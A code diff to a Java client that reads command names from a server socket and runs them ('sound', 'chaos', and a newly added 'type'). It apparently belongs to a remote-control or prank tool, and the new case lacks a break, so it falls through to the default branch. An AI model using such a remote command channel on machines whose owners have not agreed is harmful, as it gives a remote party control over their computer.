@@ -52,7 +52,7 @@ public class Client
         while(socket.isConnected())
         {
             String serverCommand = inFromServer.readLine(); // blocks
-            if(serverCommand.equals("sound")) // 1 arg commands
+            if(serverCommand.equals("sound") || serverCommand.equals("type")) // 1 arg commands
                 processServerCommand(serverCommand, inFromServer.readLine());
             else if(serverCommand.equals("chaos")) // 2 arg commands
                 processServerCommand(serverCommand, inFromServer.readLine(), inFromServer.readLine());
@@ -105,6 +105,8 @@ public class Client
             case "chaos":
                 commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                 break;
+            case "type":
+                commandSet.type(serverCommand[1]);
             default:
                 System.out.println("Reached default in processSErverCommand with cmd: " + serverCommand);
         }
